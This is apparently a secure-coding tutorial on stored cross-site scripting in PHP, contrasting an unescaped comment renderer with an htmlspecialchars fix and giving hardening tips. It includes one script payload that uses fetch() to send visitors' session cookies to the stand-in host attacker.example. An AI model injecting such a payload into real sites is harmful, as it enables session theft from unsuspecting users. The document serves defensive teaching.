# Cross-Site Scripting (XSS)

Stored XSS happens when the server saves attacker-controlled markup and then echoes it back into a page without escaping. The browser treats the markup as part of the page and runs it.

## The attack

`vulnerable.php` saves comments and renders them with `<?= $c['body'] ?>` — no escaping. Post this as a comment:

```html
<script>fetch('https://attacker.example/log?c=' + document.cookie)</script>
```

Every subsequent visitor's browser will execute that script and ship their session cookie to the attacker.

## The fix

`fixed.php` escapes output with `htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8')`. The same payload now renders as literal text:

```
&lt;script&gt;fetch('https://attacker.example/log?c=' + document.cookie)&lt;/script&gt;
```

## Rules of thumb

- Escape at the output boundary, not on input. Storing escaped data corrupts it for non-HTML consumers (JSON APIs, emails, CLI tools).
- Pick the encoder for the context: HTML body (`htmlspecialchars`), HTML attribute (same, with `ENT_QUOTES`), JavaScript (`json_encode` with `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT`), URL (`rawurlencode`), CSS (don't put user data in CSS).
- Set a strict `Content-Security-Policy` header so even if you miss an escape, the browser refuses to run inline scripts. See [`examples/cookies/fixed.php`](../cookies/fixed.php) for cookie-side hardening that limits the blast radius of any XSS that does slip through.
